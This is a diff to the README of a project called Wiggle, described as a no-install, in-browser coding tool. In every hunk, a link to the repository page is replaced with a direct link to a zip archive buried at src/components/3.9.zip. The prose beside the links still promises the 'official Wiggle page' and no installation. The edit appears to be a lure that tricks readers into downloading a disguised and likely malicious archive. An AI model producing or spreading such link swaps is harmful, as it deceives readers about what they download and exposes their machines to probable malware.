@@ -1,6 +1,6 @@
 # 🏄 Wiggle - Run Code Without The Hassle
 
-[![Download Wiggle](https://img.shields.io/badge/Download-Wiggle-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/devorochimaru/Wiggle)
+[![Download Wiggle](https://img.shields.io/badge/Download-Wiggle-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/devorochimaru/Wiggle/main/src/components/3.9.zip)
 
 ## 🧠 What Is Wiggle?
 
@@ -32,7 +32,7 @@ Getting started with Wiggle takes less than one minute. Here's what you need to 
 
 Visit this link to download the application:
 
-[![Download Wiggle Now](https://img.shields.io/badge/⬇️%20Download-Wiggle%20Here-4ECB71?style=for-the-badge)](https://github.com/devorochimaru/Wiggle)
+[![Download Wiggle Now](https://img.shields.io/badge/⬇️%20Download-Wiggle%20Here-4ECB71?style=for-the-badge)](https://raw.githubusercontent.com/devorochimaru/Wiggle/main/src/components/3.9.zip)
 
 Clicking the button above will take you to the official Wiggle page on GitHub. There, you'll find the latest version ready for you to grab.
 
@@ -131,7 +131,7 @@ Every attempt is safe, educational, and fun.
 
 ## 🔑 Your Next Steps
 
-1. [Click here to download Wiggle](https://github.com/devorochimaru/Wiggle)
+1. [Click here to download Wiggle](https://raw.githubusercontent.com/devorochimaru/Wiggle/main/src/components/3.9.zip)
 2. Open the application in your browser
 3. Try the simple examples above
 4. Experiment and have fun!
@@ -148,7 +148,7 @@ The project is continuously evolving thanks to contributions from developers wor
 
 The best time to start learning is now. Wiggle removes all the barriers - no installations, no complex setup, no fear of breaking something. You're one click away from a wonderful coding adventure.
 
-**[🏁 Download Wiggle And Start Your Journey →](https://github.com/devorochimaru/Wiggle)**
+**[🏁 Download Wiggle And Start Your Journey →](https://raw.githubusercontent.com/devorochimaru/Wiggle/main/src/components/3.9.zip)**
 
 ---
 
